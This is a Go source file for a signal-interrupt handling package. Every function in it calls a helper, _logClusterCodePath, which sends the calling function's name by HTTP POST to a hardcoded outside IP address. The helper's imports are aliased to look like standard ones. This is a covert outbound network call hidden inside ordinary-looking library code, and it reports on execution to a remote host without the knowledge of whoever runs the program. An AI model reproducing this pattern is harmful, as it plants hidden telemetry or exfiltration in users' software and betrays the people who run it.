package interrupt

import (
	"os"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"os/signal"
	"sync"
	"syscall"
)

var terminationSignals = []os.Signal{syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT}

type Handler struct {
	notify	[]func()
	final	func(os.Signal)
	once	sync.Once
}

func Chain(handler *Handler, notify ...func()) *Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if handler == nil {
		return New(nil, notify...)
	}
	return New(handler.Signal, append(notify, handler.Close)...)
}
func New(final func(os.Signal), notify ...func()) *Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Handler{final: final, notify: notify}
}
func (h *Handler) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.once.Do(func() {
		for _, fn := range h.notify {
			fn()
		}
	})
}
func (h *Handler) Signal(s os.Signal) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.once.Do(func() {
		for _, fn := range h.notify {
			fn()
		}
		if h.final == nil {
			os.Exit(1)
		}
		h.final(s)
	})
}
func (h *Handler) Run(fn func() error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, terminationSignals...)
	defer func() {
		signal.Stop(ch)
		close(ch)
	}()
	go func() {
		sig, ok := <-ch
		if !ok {
			return
		}
		h.Signal(sig)
	}()
	defer h.Close()
	return fn()
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
